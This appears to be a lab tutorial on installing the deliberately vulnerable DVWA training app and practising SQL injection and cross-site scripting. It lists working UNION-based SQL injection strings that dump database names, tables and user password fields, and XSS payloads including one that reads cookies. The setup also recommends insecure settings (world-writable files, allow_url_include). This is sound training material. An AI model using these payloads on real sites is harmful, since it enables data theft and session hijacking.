# Implementing SQL Injection & Cross Site Scripting using DVWA

### DVWA
Damn Vulnerable Web Application (DVWA) is a PHP/MySQL web application that is damn vulnerable. Its main goal is to be an aid for security professionals to test their skills and tools in a legal environment, help web developers better understand the processes of securing web applications and to aid both students & teachers to learn about web application security in a controlled class room environment.

The aim of DVWA is to practice some of the most common web vulnerabilities, with various levels of difficulty, with a simple straightforward interface. Please note, there are both documented and undocumented vulnerabilities with this software. This is intentional. You are encouraged to try and discover as many issues as possible.

#### Setting up DVWA
- **Step 1** : Type the following commands </br>
  Setting up Apache Web server, Installting DVWA, Installing Mysql, 
  ``` 
  $ sudo apt install apache2 
  $ sudo apt-get install git
  $ cd /var/www/html/
  $ sudo git clone https://github.com/ethicalhack3r/DVWA.git
  $ sudo chmod -R 777 /var/www/html/DVWA/
  $ sudo apt install mysql-server
  $ mysql -u root -p
  $ sudo service apache2 restart
  $ sudo service mysql restart
  ```
  </br>
- **Setp 2**: Type the following commands</br>
  Configure DVWA
  ```
  $ sudo vim /var/www/html/dvwa/config/config.inc.php.dist
  ```
  Add the database name, user and password of the mysql database in the php file
  ```
  $ sudo vim /etc/php5/apache2/php.ini
  ```
  Add the following lines </br>
   > **Enable Allow_url_fopen** </br>
   > **Enable Allow_url_include**
   </br>
- **Setp 3**: </br>
  Starting DVWA </br>
  Open your Browser and type http://127.0.0.1/DVWA/setup.php </br>
  Complete the basic setup process and you are ready to use your DVWA
  
### SQL Injection
SQL injection (SQLi) is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. It generally allows an attacker to view data that they are not normally able to retrieve. This might include data belonging to other users, or any other data that the application itself is able to access. In many cases, an attacker can modify or delete this data, causing persistent changes to the application's content or behavior.

In some situations, an attacker can escalate an SQL injection attack to compromise the underlying server or other back-end infrastructure, or perform a denial-of-service attack

- Display the hostname of our web app </br>
  ```' union select null, @@hostname#```</br>
  
- Display Database User </br>
  ```test' union select null, user() #``` </br>
  
- Display the Database Name </br>
  ```test' union select null, database() #```</br>
  
- List all tables in the information schema. </br>
  ```test' and 1=0 union select null, table_name from information_schema.tables #```</br>
  
- Display all the column contents in the information schema users table </br>
  ```test' and 1=0 union select null, concat(first_name,0x0a,last_name,0x0a,user,0x0a,password) from users #```</br>
  
- List all user tables in the information schema </br>
  ```test' and 1=0 union select null, table_name from information_schema.tables where table_name like 'user%'# ```</br>


### Cross Site Scripting (XSS)
Cross-Site Scripting (XSS) attacks are a type of injection, in which malicious scripts are injected into otherwise benign and trusted websites. XSS attacks occur when an attacker uses a web application to send malicious code, generally in the form of a browser side script, to a different end user. Flaws that allow these attacks to succeed are quite widespread and occur anywhere a web application uses input from a user within the output it generates without validating or encoding it.

An attacker can use XSS to send a malicious script to an unsuspecting user. The end user’s browser has no way to know that the script should not be trusted, and will execute the script. Because it thinks the script came from a trusted source, the malicious script can access any cookies, session tokens, or other sensitive information retained by the browser and used with that site. These scripts can even rewrite the content of the HTML page.

- Reflected XSS payloads </br>
  **Easy** :  ```<script>alert(“xss”)</script> ``` </br>
  **Medium** : ```<Script>alert(“SMIT”)</Script>```</br>
  **Hard** : ```<img src=x onerror=alert(“falcon”)>``` </br>

- Stored XSS Payloads</br>
  **Easy** : ```<script>alert(document.domain)</script>``` </br>
  **Medium** : ```<img src=x onerror=alert(document.domain)>```<br>
  **Hard** : ```<body onload=alert(“bingo”)>```

- DOM XSS Payloads </br>
  **Easy** : ```/?default=<script>alert(1)</script>``` </br>
  **Medium** : ```/?default=English#<script>alert(1)</script>``` </br>
  **Hard** : ```/?default=English#<script>alert(document.cookie)</script>```
